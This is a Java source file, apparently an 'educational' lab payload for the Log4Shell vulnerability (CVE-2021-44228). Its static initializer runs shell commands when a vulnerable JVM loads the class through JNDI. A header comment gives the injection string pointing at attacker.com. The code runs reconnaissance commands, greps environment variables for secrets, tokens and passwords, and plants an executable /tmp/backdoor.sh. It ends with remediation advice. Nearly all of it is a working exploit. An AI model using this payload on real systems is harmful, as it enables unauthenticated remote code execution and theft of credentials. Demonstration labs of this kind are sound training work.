/**
 * Log4Shell (CVE-2021-44228) Educational Exploit
 *
 * This class demonstrates Remote Code Execution via JNDI injection.
 * The static initializer block runs when the class is loaded by the JVM,
 * which happens automatically during JNDI object instantiation.
 *
 * ATTACK FLOW:
 * 1. Victim logs: "${jndi:ldap://attacker.com:1389/Exploit}"
 * 2. Log4j parses JNDI string and initiates lookup
 * 3. LDAP server responds with reference to this class
 * 4. Victim's JVM downloads and loads this class
 * 5. Static initializer executes -> RCE achieved!
 */
public class Exploit {
    /**
     * Static initializer - executes ONCE when class is loaded
     * This is the "payload" that achieves Remote Code Execution
     */
    static {
        try {
            System.err.println("\n╔════════════════════════════════════════════════════════════════╗");
            System.err.println("║          LOG4SHELL EXPLOIT EXECUTING (CVE-2021-44228)         ║");
            System.err.println("╚════════════════════════════════════════════════════════════════╝\n");

            // Build a comprehensive command to demonstrate the severity
            StringBuilder cmdBuilder = new StringBuilder();

            // 1. Show we're executing as root (most dangerous!)
            cmdBuilder.append("echo '=== IDENTITY & PRIVILEGES ===' && ");
            cmdBuilder.append("echo 'Current User:' && whoami && ");
            cmdBuilder.append("echo '' && ");
            cmdBuilder.append("echo 'User ID & Groups:' && id && ");
            cmdBuilder.append("echo '' && ");

            // 2. Show we can read sensitive files
            cmdBuilder.append("echo '=== FILE SYSTEM ACCESS ===' && ");
            cmdBuilder.append("echo 'Current Directory:' && pwd && ");
            cmdBuilder.append("echo '' && ");
            cmdBuilder.append("echo 'Environment Variables (including secrets):' && ");
            cmdBuilder.append("env | grep -E '(SECRET|PASSWORD|KEY|TOKEN)' && ");
            cmdBuilder.append("echo '' && ");

            // 3. Show network capabilities
            cmdBuilder.append("echo '=== NETWORK INFORMATION ===' && ");
            cmdBuilder.append("echo 'Hostname:' && hostname && ");
            cmdBuilder.append("echo '' && ");
            cmdBuilder.append("echo 'Network Interfaces:' && ip addr 2>/dev/null || ifconfig 2>/dev/null || echo 'Network tools not available' && ");
            cmdBuilder.append("echo '' && ");

            // 4. Show process information
            cmdBuilder.append("echo '=== RUNNING PROCESSES ===' && ");
            cmdBuilder.append("ps aux | head -10 && ");
            cmdBuilder.append("echo '' && ");

            // 5. Demonstrate file creation capability
            cmdBuilder.append("echo '=== DEMONSTRATING FILE WRITE ===' && ");
            cmdBuilder.append("echo 'Creating malicious file at /tmp/backdoor.sh' && ");
            cmdBuilder.append("echo '#!/bin/bash' > /tmp/backdoor.sh && ");
            cmdBuilder.append("echo 'echo \"Persistent backdoor installed!\"' >> /tmp/backdoor.sh && ");
            cmdBuilder.append("chmod +x /tmp/backdoor.sh && ");
            cmdBuilder.append("ls -l /tmp/backdoor.sh");

            String[] cmd = {"/bin/sh", "-c", cmdBuilder.toString()};

            System.err.println("Executing reconnaissance commands as: " + System.getProperty("user.name"));
            System.err.println("Java Version: " + System.getProperty("java.version"));
            System.err.println("OS: " + System.getProperty("os.name") + " " + System.getProperty("os.version"));
            System.err.println("\n--- Command Output Begin ---\n");

            Process p = java.lang.Runtime.getRuntime().exec(cmd);

            // Capture and display output
            java.io.BufferedReader reader = new java.io.BufferedReader(
                new java.io.InputStreamReader(p.getInputStream()));

            java.io.FileWriter fw = new java.io.FileWriter("/tmp/PWNED_BY_LOG4SHELL.txt");
            fw.write("╔════════════════════════════════════════════════════════════════╗\n");
            fw.write("║   REMOTE CODE EXECUTION ACHIEVED VIA LOG4SHELL (CVE-2021-44228) ║\n");
            fw.write("╚════════════════════════════════════════════════════════════════╝\n\n");
            fw.write("Timestamp: " + new java.util.Date() + "\n");
            fw.write("Exploit Type: JNDI Injection -> Remote Class Loading -> RCE\n");
            fw.write("Severity: CRITICAL (CVSS 10.0)\n\n");
            fw.write("WHY THIS IS DANGEROUS:\n");
            fw.write("======================\n");
            fw.write("• Unauthenticated: No credentials needed\n");
            fw.write("• Remote: Attack from anywhere on the network\n");
            fw.write("• Privileged: Often runs as root or application user\n");
            fw.write("• Stealthy: Can be in any logged field (User-Agent, etc.)\n\n");
            fw.write("COMMAND OUTPUT:\n");
            fw.write("================\n\n");

            String line;
            while ((line = reader.readLine()) != null) {
                fw.write(line + "\n");
                System.err.println(line);  // Also print to container logs
            }

            p.waitFor();

            fw.write("\n\n");
            fw.write("WHAT AN ATTACKER COULD DO:\n");
            fw.write("==========================\n");
            fw.write("✓ Install backdoors for persistent access\n");
            fw.write("✓ Steal sensitive data and credentials\n");
            fw.write("✓ Pivot to other systems on the network\n");
            fw.write("✓ Deploy ransomware or cryptominers\n");
            fw.write("✓ Exfiltrate customer data\n");
            fw.write("✓ Modify application behavior\n");
            fw.write("✓ Use as a foothold for supply chain attacks\n\n");
            fw.write("REMEDIATION:\n");
            fw.write("============\n");
            fw.write("1. Upgrade Log4j to 2.17.1 or later immediately\n");
            fw.write("2. Set -Dlog4j2.formatMsgNoLookups=true if upgrade not possible\n");
            fw.write("3. Use parameterized logging: logger.error(\"msg: {}\", input)\n");
            fw.write("4. Deploy Web Application Firewall (WAF) rules\n");
            fw.write("5. Monitor for JNDI lookup patterns in logs\n");

            fw.close();

            System.err.println("\n--- Command Output End ---");
            System.err.println("\n╔════════════════════════════════════════════════════════════════╗");
            System.err.println("║              EXPLOIT COMPLETED SUCCESSFULLY!                   ║");
            System.err.println("║  Full output written to: /tmp/PWNED_BY_LOG4SHELL.txt          ║");
            System.err.println("╚════════════════════════════════════════════════════════════════╝\n");

        } catch (Exception e) {
            System.err.println("\n[!] Exploit execution failed:");
            e.printStackTrace();
        }
    }
}
